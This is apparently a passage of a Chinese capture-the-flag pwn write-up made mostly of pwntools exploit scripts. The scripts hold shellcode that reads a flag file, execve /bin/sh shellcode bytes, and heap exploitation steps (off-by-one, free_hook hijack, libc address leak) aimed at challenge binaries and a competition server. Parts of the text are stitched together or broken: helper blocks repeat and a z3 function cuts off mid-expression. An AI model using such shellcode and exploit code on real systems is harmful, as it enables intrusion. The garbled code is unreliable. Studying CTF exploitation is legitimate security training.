    it      = lambda                    :p.interactive()
    uu32    = lambda data   :u32(data.ljust(4, '\0'))
    uu64    = lambda data   :u64(data.ljust(8, '\0'))
    bp      = lambda bkp                :pdbg.bp(bkp)
    li      = lambda str1,data1         :log.success(str1+'========>'+hex(data1))
    def add(index,size,text):
        ru("choice >>")
        sl(1)
        ru('index:')
        sl(index)
        ru('size:')
        sl(size)
        ru('content:')
        s(text)
    def delete(index):
        ru("choice >>")
        sl(4)
        ru('index:')
        sl(index)
    free_addr= 0x202018
    chunk_addr = 0x2020E0
    index = (chunk_addr-free_addr)/8
    payload = asm('jmp rdi')+'\x90'*5
    print(payload)
    print(len(payload))
    add(-index,7,payload)
    #gdb.attach(p)
    payload = asm(shellcraft.open('flag'))
    payload += asm(shellcraft.read(3,'rsp',0x40))
    payload += asm(shellcraft.write(1,'rsp',0x40))
    payload +='\n'
    print(len(payload))
    add(0,0,payload)
    delete(0)
    p.interactive()
### 0x05 **babypwn**
off-by-one漏洞，劫持free_hook利用setcontext进行rop，泄露地址时用z3解
    from pwn_debug import *
    from z3 import *
    pdbg=pwn_debug("./babypwn")
    pdbg.context.terminal=['tmux', 'splitw', '-h']
    context.log_level='debug'
    pdbg.remote("39.105.130.158",8888)
    switch=3
    if switch==1:
        p=pdbg.run("local")
    elif switch==2:
        p=pdbg.run("debug")
    elif switch==3:
        p=pdbg.run("remote")
    libc=ELF("./libc.so.6"))
    #-----------------------------------------------------------------------------------------    s       = lambda data               :p.send(str(data))
    sa      = lambda delim,data         :p.sendafter(str(delim), str(data)) 
    sl      = lambda data               :p.sendline(str(data)) 
    sla     = lambda delim,data         :p.sendlineafter(str(delim), str(data)) 
    r       = lambda numb=4096          :p.recv(numb)
    ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
    it      = lambda                    :p.interactive()
    uu32    = lambda data   :u32(data.ljust(4, '\0'))
    uu64    = lambda data   :u64(data.ljust(8, '\0'))
    bp      = lambda bkp                :pdbg.bp(bkp)
    sym     = lambda symbol             :pdbg.sym(symbol)
    def bpp():
        bp([])
        input()
    #elf=pdbg.elf
    #libc=pdbg.libc
    sh_x86_18="\x6a\x0b\x58\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
    sh_x86_20="\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
    sh_x64_21="\xf7\xe6\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\xb0\x3b\x0f\x05"
    #https://www.exploit-db.com/shellcodes
    #-----------------------------------------------------------------------------------------    def alloc(sz):
        sla('>>>',1)
        sla('size:',sz)
    def free(idx):
        sla('>>>',2)
        sla('index:',idx)
    def edit(idx,con):
        sla('>>>',3)
        sla('index:',idx)
        sa('content:',con)
    def show(idx):
        sla('>>>',4)
        sla('index:',idx)
    def magic(num):
        s=Solver()
        v4=BitVec("res",8*4)
        v4_t=v4
        for i in range(2):
            v4 ^= LShR((v4 ^ (32 * v4)) , 17) ^ 32 * v4 ^ ((LShR((v4 ^ (32 * v4)) , 17) ^ v4 ^ 32 * v4) '+hex(data1))
    def dbgc(addr):
        gdb.attach(p,"b*" + hex(addr) +"\n c")
    def lg(s,addr):
        print('\033[1;31;40m%20s-->0x%x\033[0m'%(s,addr))
    sh_x86_18="\x6a\x0b\x58\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
    sh_x86_20="\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
    sh_x64_21="\xf7\xe6\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\xb0\x3b\x0f\x05"
    #https://www.exploit-db.com/shellcodes
    #-----------------------------------------------------------------------------------------    def choice(idx):
        sla(">> ",str(idx))
    def add():
        choice(1)
    def edit(idx,off,sz):
        choice(2)
        sla("index: ",idx) 
        sla("offset: ",off)
        sla("size: ",sz)
    def delete(idx):
        choice(3)
        sla("index: ",idx)
    def append(idx,sz,con):
        choice(4)
        sla("index: ",idx) 
        # sla("offset: ",off)
        sla("size: ",sz)
        sa("data: ",con)
    def show(idx):
        choice(5)
        sla("index: ",idx) 
    def exp():
        # debug([0x149E,0x14D2])
        add()#0
        add()
        add()#2
        add()
        add()#4
        add()#5
        # debug([0x1400,0x1732,0x1885,0x18B7,0x18AF])
        edit(1,0x437,0x438)
        add()#6
        add()#7
        add()#8
        add()#9
        # edit(1,0x457,0x458)
        edit(1,0x457,0x458)
        edit(2,0,0x20)
        show(2)
        ru("data: ")
        data = uu64(r(6))
        lg('data',data)
        addr = data - 0x7ffa90832fe0 + 0x7ffa90647000
        append(2,0x10,'a'*0x10)